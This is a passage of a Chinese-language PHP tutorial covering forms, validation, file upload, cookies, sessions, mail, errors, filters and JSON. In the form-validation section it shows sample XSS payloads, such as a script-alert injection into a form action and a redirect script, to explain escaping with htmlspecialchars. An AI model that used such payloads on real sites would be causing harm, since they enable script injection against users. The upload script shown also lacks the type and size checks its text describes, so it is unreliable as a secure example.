href="#PHP-下拉菜单多选" class="headerlink" title="PHP 下拉菜单多选"></a>PHP 下拉菜单多选</h4><p>设置 select <strong>name=”q[]”</strong> 以数组的方式获取。</p><p>采用数组arry()函数，其余代码与单选类似：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$q &#x3D; isset($_POST[&#39;q&#39;])? $_POST[&#39;q&#39;] : &#39;&#39;;</span><br><span class="line">if(is_array($q)) &#123;</span><br><span class="line">    $sites &#x3D; array(</span><br><span class="line">            &#39;JD&#39; &#x3D;&gt; &#39;京东: http:&#x2F;&#x2F;www.JD.com&#39;,</span><br><span class="line">            &#39;baidu&#39; &#x3D;&gt; &#39; 百度: http:&#x2F;&#x2F;www.baidu.com&#39;,</span><br><span class="line">            &#39;TAOBAO&#39; &#x3D;&gt; &#39;淘宝: http:&#x2F;&#x2F;www.taobao.com&#39;,</span><br><span class="line">    );</span><br><span class="line">    foreach($q as $val) &#123;</span><br><span class="line">        echo $sites[$val] . PHP_EOL;</span><br></pre></td></tr></table></figure><p>其中PHP_EOL表示换行。</p><h2 id="PHP-表单验证"><a href="#PHP-表单验证" class="headerlink" title="PHP 表单验证"></a>PHP 表单验证</h2><p>$_SERVER[“PHP_SELF”]是超级全局变量，返回当前正在执行脚本的文件名，与 document root相关。<strong>当黑客使用跨网站脚本的HTTP链接来攻击时，该函数服务器变量也会被植入脚本。原因就是跨网站脚本是附在执行文件的路径后面的，因此函数的字符串就会包含HTTP链接后面的JavaScript程序代码。</strong>(XSS又叫 CSS (Cross-Site Script) ,跨站脚本攻击。恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。)</p><p>$_SERVER[“PHP_SELF”] 可以通过 <strong><em>htmlspecialchars()</em></strong> 函数来避免被利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号） 成为 &amp;</span><br><span class="line">&quot; （双引号） 成为 &quot;</span><br><span class="line">&#39; （单引号） 成为 &amp;#039;</span><br><span class="line">&lt; （小于） 成为 &lt;</span><br><span class="line">&gt; （大于） 成为 &gt;</span><br></pre></td></tr></table></figure><p>正常代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;]);?&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>htmlspecialchars() 把一些预定义的字符转换为 HTML 实体。可避免该函数被利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;test_form.php&#x2F;&quot;&gt;&lt;script&gt;alert(&#39;hacked&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP-验证表单数据"><a href="#PHP-验证表单数据" class="headerlink" title="PHP 验证表单数据"></a>PHP 验证表单数据</h4><p>用户提交的数据通过 PHP 的 htmlspecialchars() 函数处理，代码将不会被执行，而会被保存为HTML转义代码。</p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href(&#39;http:&#x2F;&#x2F;www.JD.com&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>处理后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href(&#39;http:&#x2F;&#x2F;www.JD.com&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP-表单-必需字段"><a href="#PHP-表单-必需字段" class="headerlink" title="PHP 表单 - 必需字段"></a>PHP 表单 - 必需字段</h4><p>$nameErr, $emailErr, $genderErr, 和 $websiteErr.这些错误变量显示在必需字段上，在每个$_POST变量中增加了一个if else语句以检查 变量是 否为空（使用empty() 函数）如果为空，将显示对应的错误信息；如果不为空，数据将传递给test_input() 函数。</p><h2 id="验证邮件和URL"><a href="#验证邮件和URL" class="headerlink" title="验证邮件和URL"></a>验证邮件和URL</h2><p><strong>int preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] )</strong></p><p>在 subject 字符串中搜索与 pattern 给出的正则表达式相匹配的内容。如果提供了 matches ，则其会被搜索的结果所填充。$matches[0] 将包含与整个模式匹配的文本，$matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推。</p><h4 id="PHP-验证名称"><a href="#PHP-验证名称" class="headerlink" title="PHP - 验证名称"></a>PHP - 验证名称</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$name &#x3D; test_input($_POST[&quot;name&quot;]);</span><br><span class="line">if (!preg_match(&quot;&#x2F;^[a-zA-Z ]*$&#x2F;&quot;,$name)) &#123;</span><br><span class="line">  $nameErr &#x3D; &quot;只允许字母和空格&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>URL,E-mail,与上面类似；将preg_match括号中替换成<code>(&quot;/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i&quot;,$website),(&quot;/([\w\-]+\@[\w\-]+\.[\w\-]+)/&quot;,$email)</code>即可。</p><h2 id="PHP-多维数组"><a href="#PHP-多维数组" class="headerlink" title="PHP 多维数组"></a>PHP 多维数组</h2><p>包含一个或多个数组的数组，在多维数组中，主数组中的每一个元素也可以是一个数组，子数组中的每一个元素也可以是一个数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 二维数组:</span><br><span class="line">$cosmetic &#x3D; array</span><br><span class="line">(</span><br><span class="line">    array(&quot;YSL&quot;,&quot;Dior&quot;,&quot;CHANEL&quot;),</span><br><span class="line">    array(&quot;GUCCI&quot;,&quot;Lancome&quot;,&quot;Guerlain&quot;),</span><br><span class="line">    array(&quot;HERMES&quot;,&quot;La_Mer&quot;,&quot;DAVIDOFF&quot;)</span><br><span class="line">);</span><br><span class="line">print_r($cosmetic);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt; YSL</span><br><span class="line">            [1] &#x3D;&gt; Dior</span><br><span class="line">            [2] &#x3D;&gt; CHANEL</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [1] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt; GUCCI</span><br><span class="line">            [1] &#x3D;&gt; Lancome</span><br><span class="line">            [2] &#x3D;&gt; Guerlain</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [2] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt; HERMES</span><br><span class="line">            [1] &#x3D;&gt; La_Mer</span><br><span class="line">            [2] &#x3D;&gt; DAVIDOFF</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="date-函数"><a href="#date-函数" class="headerlink" title="date() 函数"></a>date() 函数</h2><p>把时间戳（字符序列，表示一定的事件发生的日期/时间）格式化为可读性更好的日期和时间。</p><p>语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string date ( string $format [, int $timestamp ] )</span><br></pre></td></tr></table></figure><ul><li>d - 代表月中的天 </li><li>m - 代表月 </li><li>Y - 代表年 </li></ul><p>格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo date(&quot;Y&#x2F;m&#x2F;d&quot;) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo date(&quot;Y.m.d&quot;) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo date(&quot;Y-m-d&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2020&#x2F;10&#x2F;19</span><br><span class="line">2020.10.19</span><br><span class="line">2020-10-19</span><br></pre></td></tr></table></figure><p>完整的 PHP Date 参考手册可访问菜鸟教程<a href="https://www.runoob.com/php/php-ref-date.html">https://www.runoob.com/php/php-ref-date.html</a></p><h2 id="PHP-包含文件"><a href="#PHP-包含文件" class="headerlink" title="PHP 包含文件"></a>PHP 包含文件</h2><h4 id="include-和-require-语句"><a href="#include-和-require-语句" class="headerlink" title="include 和 require 语句:"></a>include 和 require 语句:</h4><p>在执行流中插入写在其他文件中的有用的代码。</p><p><strong>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：</strong></p><ul><li>require 生成一个致命错误，在错误发生后脚本会停止执行。</li><li>include 生成一个警告，在错误发生后脚本会继续执行。</li></ul><h2 id="PHP-文件处理"><a href="#PHP-文件处理" class="headerlink" title="PHP 文件处理"></a>PHP 文件处理</h2><h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>fopen()的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file&#x3D;fopen(&quot;blackpink.txt&quot;,&quot;r&quot;);</span><br></pre></td></tr></table></figure><p>关闭文件fclose() 函数，语法与打开相同。</p><h4 id="feof-函数"><a href="#feof-函数" class="headerlink" title="feof() 函数"></a>feof() 函数</h4><p>检测是否已到达文件末尾（EOF）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (feof($file)) echo &quot;文件结尾&quot;;</span><br></pre></td></tr></table></figure><ul><li><strong>fgets() 函数</strong>用于从文件中逐行读取文件。</li><li><strong>fgetc() 函数</strong>用于从文件中逐字符地读取文件。</li></ul><h2 id="PHP文件上传"><a href="#PHP文件上传" class="headerlink" title="PHP文件上传"></a>PHP文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">|-----upload             # 文件上传的目录</span><br><span class="line">|-----form.html          # 表单文件</span><br><span class="line">|-----upload_file.php    # php 上传代码</span><br></pre></td></tr></table></figure><h4 id="创建一个文件上传表单"><a href="#创建一个文件上传表单" class="headerlink" title="创建一个文件上传表单"></a>创建一个文件上传表单</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;blackpink(blackpink.com)&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p> <strong>enctype</strong> 规定了在提交表单时要使用哪种内容类型,<strong>type=”file”</strong> 属性规定了应该把输入作为文件来处理</p><h4 id="创建上传脚本"><a href="#创建上传脚本" class="headerlink" title="创建上传脚本"></a>创建上传脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] &#x2F; 1024) . &quot; kB&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];&#x2F;&#x2F;存储在服务器的文件的临时副本的名称</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>用户只能上传 .gif、.jpeg、.jpg、.png 文件，文件大小必须小于 200 kB。文件被上传结束后，默认被存储在了临时目录中，须将它从临时目录中删除或移动到其它地方，脚本执行完后临时目录里的文件肯定会被删除，所以在删除之前要用PHP的 copy() 函数将它复制到其它位置。</p><h2 id="PHP-Cookie"><a href="#PHP-Cookie" class="headerlink" title="PHP Cookie"></a>PHP Cookie</h2><p>常用于识别用户，通过setcookie() 函数（必须位于 <html> 标签之前。）设置 cookie。</html></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(name, value, expire, path, domain);</span><br></pre></td></tr></table></figure><p>$_COOKIE 变量用于取回 cookie 的值，isset() 函数来确认是否已设置了 cookie。</p><p>删除 Cookie：使过期日期变更为过去的时间点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 设置 cookie 过期时间为过去 0.5小时</span><br><span class="line">setcookie(&quot;user&quot;, &quot;&quot;, time()-1800);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="PHP-Session"><a href="#PHP-Session" class="headerlink" title="PHP Session"></a>PHP Session</h2><p>为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。但会话信息是临时的，在用户离开网站后将被删除，故若需要永久存储信息，可以把数据存储在数据库中。</p><p>启动会话：session_start() 函数必须位于 <html> 标签之前。</html></p><p>存储和取回 session 变量：使用 PHP $_SESSION 变量</p><p>删除某些 session 数据：使用 unset() 或 session_destroy() 函数。</p><h2 id="PHP-发送电子邮件"><a href="#PHP-发送电子邮件" class="headerlink" title="PHP 发送电子邮件"></a>PHP 发送电子邮件</h2><h4 id="PHP-mail-函数"><a href="#PHP-mail-函数" class="headerlink" title="PHP mail() 函数"></a>PHP mail() 函数</h4><p>从脚本中发送电子邮件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail(to,subject,message,headers,parameters)</span><br></pre></td></tr></table></figure><p>实例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$to &#x3D; &quot;someone@example.com&quot;;         &#x2F;&#x2F; 邮件接收者</span><br><span class="line">$subject &#x3D; &quot;参数邮件&quot;;                &#x2F;&#x2F; 邮件标题</span><br><span class="line">$message &#x3D; &quot;Hello! 这是邮件的内容。&quot;;  &#x2F;&#x2F; 邮件正文</span><br><span class="line">$from &#x3D; &quot;someonelse@example.com&quot;;   &#x2F;&#x2F; 邮件发送者</span><br><span class="line">$headers &#x3D; &quot;From:&quot; . $from;         &#x2F;&#x2F; 头部信息设置</span><br><span class="line">mail($to,$subject,$message,$headers);</span><br><span class="line">echo &quot;邮件已发送&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP-E-mail-注入"><a href="#PHP-E-mail-注入" class="headerlink" title="PHP E-mail 注入"></a>PHP E-mail 注入</h4><p>常规php e-mail 存在的问题：未经授权的用户可通过输入表单在邮件头部插入数据。为防止 e-mail 注入应对输入进行验证。可使用 PHP 过滤器来对输入进行验证：</p><ul><li>FILTER_SANITIZE_EMAIL 过滤器从字符串中删除电子邮件的非法字符</li><li>FILTER_VALIDATE_EMAIL 过滤器验证电子邮件地址的值</li></ul><h2 id="PHP-错误处理"><a href="#PHP-错误处理" class="headerlink" title="PHP 错误处理"></a>PHP 错误处理</h2><h4 id="使用-die-函数"><a href="#使用-die-函数" class="headerlink" title="使用 die() 函数"></a>使用 die() 函数</h4><h4 id="创建自定义错误处理器"><a href="#创建自定义错误处理器" class="headerlink" title="创建自定义错误处理器"></a>创建自定义错误处理器</h4><p>创建了一个专用函数，可以在 PHP 中发生错误时调用该函数。该函数必须有能力处理至少两个参数 (error level 和 error message)，最多可以接受五个参数（可选的：file, line-number 和 error context）</p><h4 id="设置错误处理程序"><a href="#设置错误处理程序" class="headerlink" title="设置错误处理程序"></a>设置错误处理程序</h4><p>若自定义函数要处理所有错误，set_error_handler() 仅需要一个参数</p><h4 id="触发错误：-trigger-error"><a href="#触发错误：-trigger-error" class="headerlink" title="触发错误： trigger_error()"></a>触发错误： trigger_error()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test&#x3D;2;</span><br><span class="line">if ($test&gt;1)</span><br><span class="line">&#123;</span><br><span class="line">    trigger_error(&quot;变量值必须小于等于 1&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以在脚本中任何位置触发错误，通过添加的第二个参数，规定所触发的错误类型。</p><ul><li>E_USER_ERROR - 错误无法恢复。脚本执行被中断。</li><li>E_USER_WARNING - 脚本执行不被中断。</li><li>E_USER_NOTICE -在脚本发现可能有错误时发生，但也可能在脚本正常运行时发生。</li></ul><h4 id="错误记录"><a href="#错误记录" class="headerlink" title="错误记录"></a>错误记录</h4><p>根据在 php.ini 中的 error_log 配置，PHP 向服务器的记录系统或文件发送错误记录，通过 error_log() 函数，向指定的文件或远程目的地发送错误记录；可通过电子邮件发送错误消息。</p><h2 id="PHP-异常处理"><a href="#PHP-异常处理" class="headerlink" title="PHP 异常处理"></a>PHP 异常处理</h2><h4 id="Try、throw-和-catch"><a href="#Try、throw-和-catch" class="headerlink" title="Try、throw 和 catch"></a>Try、throw 和 catch</h4><ol><li>Try - 使用异常的函数应该位于 “try” 代码块内。如果无触发异常，则代码将照常继续执行。如果异常被触发，会抛出一个异常。</li><li>Throw - 里规定如何触发异常。每一个 “throw” 必须对应至少一个 “catch”。</li><li>Catch - “catch” 代码块会捕获异常，并创建一个包含异常信息的对象。</li></ol><h4 id="创建一个自定义的-Exception-类（继承了-PHP-的-exception-类的所有属性，可向其添加自定义的函数）"><a href="#创建一个自定义的-Exception-类（继承了-PHP-的-exception-类的所有属性，可向其添加自定义的函数）" class="headerlink" title="创建一个自定义的 Exception 类（继承了 PHP 的 exception 类的所有属性，可向其添加自定义的函数）"></a>创建一个自定义的 Exception 类（继承了 PHP 的 exception 类的所有属性，可向其添加自定义的函数）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class customException extends Exception</span><br><span class="line">&#123;</span><br><span class="line">    public function errorMessage()</span><br><span class="line">    &#123;</span><br><span class="line">        $errorMsg &#x3D; &#39;错误行号 &#39;.$this-&gt;getLine().&#39; in &#39;.$this-&gt;getFile()</span><br><span class="line">        .&#39;: &lt;b&gt;&#39;.$this-&gt;getMessage().&#39;&lt;&#x2F;b&gt; 不是一个合法的 E-Mail 地址&#39;;</span><br><span class="line">        return $errorMsg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$email &#x3D; &quot;someone@example...com&quot;;</span><br><span class="line"> </span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">    if(filter_var($email, FILTER_VALIDATE_EMAIL) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; 如果是个不合法的邮箱地址，抛出异常</span><br><span class="line">        throw new customException($email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">catch (customException $e)&#x2F;&#x2F;catch&quot; 代码块捕获异常，并显示错误消息。</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;display custom message</span><br><span class="line">echo $e-&gt;errorMessage();&#x2F;&#x2F;如果 e-mail 地址不合法，则该函数返回一条错误消息</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>设置顶层异常处理器：set_exception_handler() 函数可设置处理所有未捕获异常的用户定义函数。</p><h2 id="PHP-过滤器"><a href="#PHP-过滤器" class="headerlink" title="PHP 过滤器"></a>PHP 过滤器</h2><p>用于验证和过滤来自非安全来源的数据。</p><ul><li>filter_var() - 通过一个指定的过滤器来过滤单一的变量</li><li>filter_var_array() - 通过相同的或不同的过滤器来过滤多个变量</li><li>filter_input - 获取一个输入变量，并对它进行过滤</li><li>filter_input_array - 获取多个输入变量，并通过相同的或不同的过滤器对它们进行过滤</li></ul><p>Validating 过滤器：用于验证用户输入，严格的格式规则（比如 URL 或 E-Mail 验证），如果成功则返回预期的类型，如果失败则返回 FALSE。</p><p>Sanitizing 过滤器：用于允许或禁止字符串中指定的字符，无数据格式规则，始终返回字符串。</p><p>选项和标志用于向指定的过滤器添加额外的过滤选项，不同的过滤器有不同的选项和标志。</p><h4 id="验证输入"><a href="#验证输入" class="headerlink" title="验证输入"></a>验证输入</h4><p>先确认是否存在我们正在查找的输入数据，然后用 filter_input() 函数过滤输入的数据；检测是否存在 输入变量，如果存在输入变量，检测它是否是有效的地址。</p><p>净化输入：filter_input()</p><h4 id="过滤多个输入：filter-var-array-或-the-filter-input-array"><a href="#过滤多个输入：filter-var-array-或-the-filter-input-array" class="headerlink" title="过滤多个输入：filter_var_array 或 the filter_input_array"></a>过滤多个输入：filter_var_array 或 the filter_input_array</h4><p>filter_input_array() 函数的第二个参数可以是数组或单一过滤器的 ID。</p><p>如果该参数是单一过滤器的 ID，那这个指定的过滤器会过滤输入数组中所有的值。</p><p>如果该参数是一个数组，那么此数组必须遵循下面的规则：</p><ul><li>必须是一个关联数组，其中包含的输入变量是数组的键</li><li>此数组的值必须是过滤器的 ID ，或者是规定了过滤器、标志和选项的数组</li></ul><h4 id="Filter-Callback"><a href="#Filter-Callback" class="headerlink" title="Filter Callback"></a>Filter Callback</h4><p>调用自定义的函数，将准备用到的过滤器的函数，按指定选项的规定方法进行规定；在关联数组中，带有名称 “options”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function convertSpace($string)</span><br><span class="line">&#123;</span><br><span class="line">    return str_replace(&quot;_&quot;, &quot;.&quot;, $string);&#x2F;&#x2F;创建一个把 &quot;_&quot; 替换为 &quot;.&quot; 的函数</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$string &#x3D; &quot;black_pink!&quot;;</span><br><span class="line"> </span><br><span class="line">echo filter_var($string, FILTER_CALLBACK,</span><br><span class="line">array(&quot;options&quot;&#x3D;&gt;&quot;convertSpace&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：black.pink!</p><h2 id="PHP-JSON"><a href="#PHP-JSON" class="headerlink" title="PHP JSON"></a>PHP JSON</h2><h4 id="json-encode：用于对变量进行-JSON-编码"><a href="#json-encode：用于对变量进行-JSON-编码" class="headerlink" title="json_encode：用于对变量进行 JSON 编码"></a>json_encode：用于对变量进行 JSON 编码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string json_encode ( $value [, $options &#x3D; 0 ] )</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $arr &#x3D; array(&#39;a&#39; &#x3D;&gt; 1, &#39;b&#39; &#x3D;&gt; 2, &#39;c&#39; &#x3D;&gt; 3, &#39;d&#39; &#x3D;&gt; 4, &#39;e&#39; &#x3D;&gt; 5);</span><br><span class="line">   echo json_encode($arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：{“a”:1,”b”:2,”c”:3,”d”:4,”e”:5}</p><h4 id="将-PHP-对象转换为-JSON-格式数据"><a href="#将-PHP-对象转换为-JSON-格式数据" class="headerlink" title="将 PHP 对象转换为 JSON 格式数据"></a>将 PHP 对象转换为 JSON 格式数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   class Emp &#123;</span><br><span class="line">       public $name &#x3D; &quot;&quot;;</span><br><span class="line">       public $hobbies  &#x3D; &quot;&quot;;</span><br><span class="line">       public $birthdate &#x3D; &quot;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   $e &#x3D; new Emp();</span><br><span class="line">   